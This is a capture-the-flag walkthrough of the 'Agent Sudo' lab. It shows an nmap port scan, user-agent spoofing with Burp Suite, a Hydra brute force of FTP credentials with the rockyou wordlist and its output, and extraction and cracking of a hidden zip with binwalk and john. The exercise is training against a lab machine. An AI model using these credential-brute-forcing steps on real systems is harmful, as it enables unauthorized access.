# Agent Sudo
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

# Task 1
Deploy the machine

# Task 2 Enumerate
How many open ports?
Ans:  3
```console 
$ sudo nmap 10.10.66.70
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-30 20:53 PST
Nmap scan report for 10.10.66.70
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds

```

How you redirect yourself to a secret page?
```
Dear agents,  
  
Use your own **codename** as user-agent to access the site.  
  
From,  
Agent R
```
the codename is the hint
Ans: user-agent

What is agent name?
I used burpsuite to intercept the connection in http://<ip_address>
In proxy tab, click intercept then let the intercept on then open browser. Paste the url into the browser. Change the header user-agent into agent name, then forward and intercept off. The name of the agent looks like like agent R, so i tried to change to A and B nothing happened. But in C we have a result
```
Attention chris,  
  
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!  
  
From,  
Agent R
```
Ans: chris

# Task 3 Hash cracking and brute-force
Done enumerate the machine? Time to brute your way out.

FTP password
research how to hydra or hydra -h. 
```
Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```
we have ftp, so we use ftp example
``` console
ydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.41.72
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-02 21:25:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.41.72:21/
[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
[21][ftp] host: 10.10.41.72   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-02 21:26:57
```
the password is crystal
Ans: crystal

Zip file password
now login to ftp.
``` console
ftp <ip_address>
Connected to 10.10.41.72.
220 (vsFTPd 3.0.3)
Name (10.10.41.72:yoky): chris
331 Please specify the password.
Password:
```
enter the username chris and the password crystal
the ftp server has 3 files, download it to our machine.
```console
get To_agentJ.txt
get cute-alien.jpg
get cutie.png
```
The text file giving us more info.
```console
$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```
by using binwalk to both png files. The cutie has hidden zip file, so extract it by using binwalk -e. Now its extracted, redirect to the extracted directory. it has txt and zip file. The txt file is empty

Zip file password
use john the ripper
Ans: alien
